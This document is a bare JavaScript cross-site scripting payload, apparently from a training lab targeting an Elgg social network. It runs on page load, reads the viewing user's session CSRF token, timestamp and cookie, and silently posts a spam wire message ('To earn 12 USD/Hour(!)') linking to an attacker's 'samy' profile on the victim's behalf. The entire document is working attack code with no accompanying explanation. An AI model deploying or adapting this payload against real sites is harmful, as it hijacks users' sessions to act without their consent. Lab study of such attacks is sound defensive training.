<script type="text/javascript">
        window.onload = function(){
    	
    	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="__elgg_token="+elgg.security.token.__elgg_token;

        var sendurl="http://www.xsslabelgg.com/action/thewire/add";
        
        var namee = elgg.session.user.username;
        
        var userid = elgg.session.user.owner_guid;

        var data = new FormData();
        data.append('__elgg_token', elgg.security.token.__elgg_token );
        data.append('__elgg_ts', elgg.security.token.__elgg_ts);

        
        var postdata = 'To earn 12 USD/Hour(!), visit now \n';
        var linkk = 'http://www.xsslabelgg.com/profile/samy' //+namee;

        data.append('body', postdata+linkk);
       
        
        if(elgg.session.user.guid != elgg.page_owner.guid)
        {
    	var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        
        Ajax.setRequestHeader("Cookie",document.cookie);

        Ajax.send(data);
        console.log('success');
    	}
    }
    </script>